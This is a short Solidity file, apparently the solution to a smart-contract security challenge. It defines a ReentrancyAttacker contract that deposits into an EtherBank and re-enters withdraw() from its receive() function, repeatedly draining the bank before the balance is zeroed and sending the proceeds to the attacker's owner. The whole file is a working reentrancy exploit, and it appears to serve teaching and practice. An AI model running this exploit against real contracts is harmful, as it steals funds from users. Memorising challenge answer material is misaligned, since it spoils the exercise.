// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice SOLUTION for challenge 01. Re-enters withdraw() from receive().
contract ReentrancyAttacker {
    IEtherBank public immutable bank;
    address public immutable owner;

    constructor(address bank_) {
        bank = IEtherBank(bank_);
        owner = msg.sender;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        // Keep withdrawing our (still un-zeroed) balance while the bank has enough ETH.
        if (address(bank).balance >= msg.value && msg.value > 0) {
            bank.withdraw();
        }
    }
}
